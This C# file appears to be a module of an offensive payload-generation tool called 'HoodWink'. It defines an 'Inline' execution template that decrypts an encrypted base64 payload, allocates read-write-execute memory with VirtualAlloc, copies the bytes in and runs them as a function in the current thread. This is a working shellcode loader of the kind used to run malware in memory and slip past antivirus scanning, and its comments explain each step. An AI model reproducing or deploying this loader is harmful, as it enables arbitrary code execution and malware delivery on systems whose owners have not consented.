using HoodWink.Models;

namespace HoodWink.Modules
{
    public class Inline : Models.Module
    {
        public override string Name => "Inline";

        public override string Description => "Execute in Inline and in current thread";

        public override Types Type => Types.Inline;

        public override string Header => Models.Defaults.Header;

        public override string Footer => Models.Defaults.Footer;

        public override string Core => @"         
         byte[] payload = Decrypt(b64, key, iv);

         // Debug
         // Console.WriteLine(""Decrypted Size: "" + payload.Length);
         // string hexPayload = BitConverter.ToString(payload);
         // Console.WriteLine(""HexString: 0x"" + hexPayload.Replace(""-"", "",0x""));

         // VirtualAlloc(zero to allocate memory at first viable location,
         //              amount of mem to allocate,
         //              magic value which maps to MEM_COMMIT in kernel32 it will allocate mem right away
         //              magic value which maps to RWX (read/write/execute) in kernel32
         //              )
         IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);

         // Copy(byte array to copy to mem,
         //      index in byte array to begin copying at
         //      where to begin copying to
         //      how many bytes to copy            
         Marshal.Copy(payload, 0, ptr, payload.Length);

         // Convert unmanaged function pointer to a delegate
         // Marshal.GetDelegateForFunctionPointer Method(): https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=net-7.0
         WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));

         // Run 
         r();
      }";
    }
}
